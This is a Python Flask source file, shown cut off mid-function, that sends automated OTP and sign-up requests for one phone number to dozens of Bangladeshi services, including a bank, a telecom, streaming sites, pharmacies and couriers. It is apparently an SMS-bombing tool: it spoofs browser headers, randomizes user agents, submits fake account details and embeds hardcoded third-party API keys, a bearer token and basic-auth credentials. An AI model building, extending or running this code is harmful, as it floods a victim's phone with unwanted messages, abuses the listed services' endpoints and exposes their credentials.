from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import threading
from fake_useragent import UserAgent
import requests
import inspect
import sys
ua = UserAgent()
app = Flask(__name__, template_folder="templates", static_folder="static")
CORS(app)

# ===================== API FUNCTIONS =====================

def call_dhakabank_api(phone_number):
    url = "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION"
    session = requests.Session()

    # Step 1: Load the site to get updated cookies
    session.get("https://ezybank.dhakabank.com.bd/ekyc")

    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://ezybank.dhakabank.com.bd",
        "Referer": "https://ezybank.dhakabank.com.bd/ekyc",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android"
    }

    data = {
        "mobile": phone_number[-11:]
    }

    try:
        response = session.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_cineplex_api(phone_number):
    url = "https://cineplex-ticket-api.cineplexbd.com/api/v1/register"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "application": "application/json",
        "appsource": "web",
        "authorization": "Bearer null",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundary7gDCVwGxohmTHpf1",
        "device-key": "f6309be525aad072c704cce3223b99b1480b5cfd65f27eb9a33f23a4e24eface",
        "origin": "https://ticket.cineplexbd.com",
        "referer": "https://ticket.cineplexbd.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": ua.random
    }

    data = f'''------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="name"\r
\r
Father \r
------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="msisdn"\r
\r
{phone_number[-11:]}\r
------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="email"\r
\r
google@gmail.com\r
------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="gender"\r
\r
1\r
------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="password"\r
\r
poiuytre\r
------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="confirm_password"\r
\r
poiuytre\r
------WebKitFormBoundary7gDCVwGxohmTHpf1\r
Content-Disposition: form-data; name="r_token"\r
\r
asdfadfasdfasdfa\r
------WebKitFormBoundary7gDCVwGxohmTHpf1--\r
'''

    try:
        response = requests.post(url, headers=headers, data=data.encode('utf-8'))
        return response.status_code == 200
    except Exception:
        return False

def call_chorki_api(phone_number):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "authorization": "",
        "content-type": "application/json",
        "origin": "https://www.chorki.com",
        "referer": "https://www.chorki.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": ua.random
    }
    data = {
        "number": "+88" + phone_number[-10:]
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_redx_api(phone_number):
    url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://redx.com.bd",
        "referer": "https://redx.com.bd/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": ua.random
    }
    data = {
        "phoneNumber": "0" + phone_number[-10:]  # ensures 01XXXXXXXXX format
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_zatiq_api(phone_number):
    url = "https://easybill.zatiq.tech/api/auth/v1/send_otp"
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "application-type": "Merchant",
        "device-type": "Web",
        "origin": "https://merchant.zatiqeasy.com",
        "referer": "https://merchant.zatiqeasy.com/",
        "user-agent": ua.random
    }
    data = {
        "code": "+880",
        "country_code": "BD",
        "phone": "0" + phone_number[-10:],  # Ensure format like 013xxxxxxx
        "is_existing_user": False
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_binge_api(phone_number):
    url = f"https://web-api.binge.buzz/api/v3/otp/send/+88{phone_number[-10:]}"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzQ4MjY1ODg3LCJleHAiOjE3NDg0Mzg2ODd9.IniCSaj4DTLDVrfBer1a1cXxzbhkjukt0WH0MQ9-Eis",
        "Device-Type": "web",
        "Origin": "https://binge.buzz",
        "Referer": "https://binge.buzz/",
        "User-Agent": ua.random
    }

    try:
        response = requests.get(url, headers=headers)
        return response.status_code == 200
    except Exception:
        return False

def call_deeptoplay_api(phone_number):
    url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.deeptoplay.com",
        "referer": "https://www.deeptoplay.com/",
        "user-agent": ua.random
    }
    data = {
        "number": "+88" + phone_number[-10:]  # Ensure correct Bangladeshi format
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_fundesh_api(phone_number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://fundesh.com.bd",
        "referer": "https://fundesh.com.bd/fundesh/profile",
        "user-agent": ua.random
    }
    data = {
        "msisdn": phone_number[-10:]  # Remove +88 and use format like 131xxxxxxx
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_bioscope_api(phone_number):
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "authorization": "",
        "content-type": "application/json",
        "origin": "https://www.bioscopelive.com",
        "referer": "https://www.bioscopelive.com/",
        "user-agent": ua.random
    }
    data = {
        "phone": "+88" + phone_number[-11:]  # Ensure number format like 013xxxxxxxx
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_classroombd_api(phone_number):
    import requests
    import re

    session = requests.Session()
    try:
        # Step 1: Get the registration page to retrieve CSRF token
        res = session.get("https://classroombangladesh.com/register")
        csrf_token_match = re.search(r'<meta name="csrf-token" content="(.+?)"', res.text)
        if not csrf_token_match:
            return False
        csrf_token = csrf_token_match.group(1)

        # Step 2: Prepare headers and send OTP request
        headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://classroombangladesh.com",
            "referer": "https://classroombangladesh.com/register",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest"
        }
        data = f"phone={phone_number}"

        response = session.post("https://classroombangladesh.com/send-otp", headers=headers, data=data)
        return response.status_code == 200
    except Exception:
        return False

def call_bohubrihi_api(phone_number):
    url = "https://bb-api.bohubrihi.com/public/activity/otp"
    headers = {
        "accept": "application/json, text/plain, */*",
        "authorization": "Bearer undefined",
        "content-type": "application/json",
        "origin": "https://bohubrihi.com",
        "referer": "https://bohubrihi.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }
    data = {
        "phone": "0" + phone_number[-10:],  # Ensure number format like 013xxxxxxx
        "intent": "login"
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_pathao_api(phone_number):
    url = "https://webauth.pathao.com/auth/get-otp"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://food.pathao.com",
        "referer": "https://food.pathao.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = {
        "country_prefix": "880",
        "national_number": phone_number.lstrip("+880"),
        "country_id": 1,
        "client_id": "2687095231"
    }

    try:
        response = requests.post(url, json=data, headers=headers)
        return response.status_code == 200
    except:
        return False

def call_acs_api(phone_number):
    url = "https://auth.acsfutureschool.com/api/v1/otp/send"

    headers = {
        "authority": "auth.acsfutureschool.com",
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.acsfutureschool.com",
        "referer": "https://www.acsfutureschool.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    payload = {
        "phone": phone_number
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_bikroy_api(phone_number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_number.lstrip('+88')}"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "bn",
        "application-name": "web",
        "referer": "https://bikroy.com/bn/users/login?action=my-account&redirect-url=%2Fbn%2Fmy%2Fdashboard",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    try:
        response = requests.get(url, headers=headers)
        return response.status_code == 200
    except:
        return False

def call_call_api(mobile_number):
    url = f"https://call-api-vhtx.onrender.com/sms/api/v1?num={mobile_number}"
    try:
        return requests.get(url).status_code == 200
    except:
        return False

def call_hoichoi_api(mobile_number):
    phone = "+88" + mobile_number
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-0f9d0956-1f49-248f-f16e-1ea7d99b1da8"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.hoichoi.tv",
        "referer": "https://www.hoichoi.tv/",
        "user-agent": "Mozilla/5.0",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }
    payload = {
        "phoneNumber": phone,
        "requestType": "send",
        "whatsappConsent": True
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except:
        return False

def call_apex_api(phone_number):
    url = 'https://api.apex4u.com/api/auth/login'
    headers = {
        'authority': 'api.apex4u.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://apex4u.com',
        'referer': 'https://apex4u.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    payload = {
        'phoneNumber': phone_number
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error during API call: {e}")
        return None

def call_gpfi_api(phone_number):
    url = 'https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': 'Basic bmVtb2JsdWU6QXBpVXNlckBHUEZp',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gpfi.grameenphone.com',
        'Referer': 'https://gpfi.grameenphone.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    payload = {
        'phone': phone_number,
        'email': '',
        'language': 'en'
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error during GPFI API call: {e}")
        return None

def call_ghoori_api(phone_number):
    phone = "+88" + phone_number
    url = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://ghoorilearning.com",
        "Referer": "https://ghoorilearning.com/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
    data = {"mobile_no": phone_number}

    try:
        response = requests.post(url, headers=headers, json=data, verify=False)
        return response.status_code == 200
    except Exception:
        return False

def call_easy_api(phone_number):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://easy.com.bd",
        "Referer": "https://easy.com.bd/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "device-key": "f3aa5acaf17de64db7d82a00c73178af",
        "lang": "en",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }
    payload = {
        "social_login_id": "",
        "name": "Rrrr",
        "email": "google@gmail.com",
        "mobile": phone_number,
        "password": "12345678",
        "password_confirmation": "12345678",
        "device_key": "f3aa5acaf17de64db7d82a00c73178af"
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_sundarban_api(phone_number):
    url = "https://api-gateway.sundarbancourierltd.com/graphql"
    headers = {
        "authority": "api-gateway.sundarbancourierltd.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "",  # Left blank as in curl
        "content-type": "application/json",
        "origin": "https://customer.sundarbancourierltd.com",
        "referer": "https://customer.sundarbancourierltd.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    payload = {
        "operationName": "CreateAccessToken",
        "variables": {
            "accessTokenFilter": {
                "userName": phone_number
            }
        },
        "query": """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
  createAccessToken(accessTokenFilter: $accessTokenFilter) {
    message
    statusCode
    result {
      phone
      otpCounter
      __typename
    }
    __typename
  }
}"""
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_quizgiri_api(phone_number):
    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-type": "application/json; charset=utf-8",
        "Origin": "https://app.quizgiri.com.bd",
        "Referer": "https://app.quizgiri.com.bd/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "x-api-key": "gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G"
    }

    payload = {
        "phone": phone_number,
        "country_code": "+88",
        "fcm_token": None
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False

def call_romoni_api(phone_number):
    url = f"https://romoni.com.bd/api/send-otp?phone={phone_number}"
    headers = {
        "authority": "romoni.com.bd",
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "referer": "https://romoni.com.bd/signup",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        # Cookie not required unless you want to simulate a logged-in session
    }

    try:
        response = requests.get(url, headers=headers)  
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False

def call_bdtickets_api(phone_number):
    url = "https://api.bdtickets.com:20100/v1/auth"
    headers = {
        "authority": "api.bdtickets.com:20100",
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://bdtickets.com",
        "referer": "https://bdtickets.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    payload = {
        "createUserCheck": True,
        "phoneNumber": f"+88{phone_number.lstrip('+')}",
        "applicationChannel": "WEB_APP"
    }

    try:
        response = requests.post(url, headers=headers, json=payload) 
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False

def call_gpfi1_api(phone_number=None):
    if phone_number is None:
        phone_number = input("Enter phone number for GPFI API: ").strip()

    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.grameenphone.com",
        "Referer": "https://www.grameenphone.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    payload = {
        "msisdn": phone_number
    }

    try:
        response = requests.post(url, headers=headers, data=payload)
        return response.status_code == 200
    except:
        return False

def call_arogga_api(phone_number):
    url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner="

    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "origin": "https://m.arogga.com",
        "referer": "https://m.arogga.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = {
        "mobile": f"+88{phone_number}",
        "fcmToken": "",
        "referral": ""
    }

    try:
        res = requests.post(url, headers=headers, data=data, timeout=10)
        return res.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_medeasy_api(phone_number):
    phone = "+88" + phone_number
    url = f"https://api.medeasy.health/api/send-otp/{phone}/"
    headers = {
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Origin": "https://medeasy.health",
        "Referer": "https://medeasy.health/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    try:
        response = requests.get(url, headers=headers)
        return response.status_code == 200
    except Exception:
        return False

def call_osudpotro_api(phone_number):
    phone = "+88-" + phone_number
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://osudpotro.com",
        "Referer": "https://osudpotro.com/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
    data = {
        "mobile": phone,
        "deviceToken": "web",
        "language": "en",
        "os": "web"
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_arogga_api(phone_number):
    phone = "%2B88" + phone_number
    url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner="
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://m.arogga.com",
        "Referer": "https://m.arogga.com/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
    data = f"mobile={phone}&fcmToken=&referral="

    try:
        response = requests.post(url, headers=headers, data=data)
        return response.status_code == 200
    except Exception:
        return False

def call_medeasy_api(phone_number):
    phone = "+88" + phone_number
    url = f"https://api.medeasy.health/api/send-otp/{phone}/"
    headers = {
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Origin": "https://medeasy.health",
        "Referer": "https://medeasy.health/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }

    try:
        response = requests.get(url, headers=headers)
        return response.status_code == 200
    except Exception:
        return False

def call_ula_api(phone_number):
    url = "https://eportal.ula.com.bd/api/send-otp-to-phone"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.ula.com.bd",
        "referer": "https://www.ula.com.bd/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }
    data = {
        "phone_number": "+88" + phone_number,
        "from": "customer"
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_lazzpharma_api(phone_number):
    url = "https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "access-control-allow-origin": "*",
        "content-type": "application/json",
        "origin": "https://www.lazzpharma.com",
        "referer": "https://www.lazzpharma.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }
    data = {
        "ActivityId": "1834b897-4884-4630-a909-b1f054ac10ed",
        "Phone": "+88" + phone_number
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        return response.status_code == 200
    except Exception:
        return False

def call_rokomari_api(phone_number):
    url = f"https://www.rokomari.com/otp/send?emailOrPhone=88{phone_number}&countryCode=BD"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "0",
        "origin": "https://www.rokomari.com",
        "referer": "https://www.rokomari.com/login",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest"
    }

    try:
        response = requests.post(url, headers=headers)
        return response.status_code == 200
    except Exception:
        return False

def call_smartpostbd_api(phone_number):
    url = 'https://api.smartpostbd.com/online-booking/api/register-otp'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarysGgq52bptHgKt5Se',
        'Origin': 'https://online.bpodms.gov.bd',
        'Referer': 'https://online.bpodms.gov.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    data = (
        '------WebKitFormBoundarysGgq52bptHgKt5Se\r\n'
        'Content-Disposition: form-data; name="phone"\r\n\r\n'
        f'{phone_number}\r\n'
        '------WebKitFormBoundarysGgq52bptHgKt5Se\r\n'
        'Content-Disposition: form-data; name="password"\r\n\r\n'
        'A12345678a\r\n'
        '------WebKitFormBoundarysGgq52bptHgKt5Se\r\n'
        'Content-Disposition: form-data; name="repassword"\r\n\r\n'
        'A12345678a\r\n'
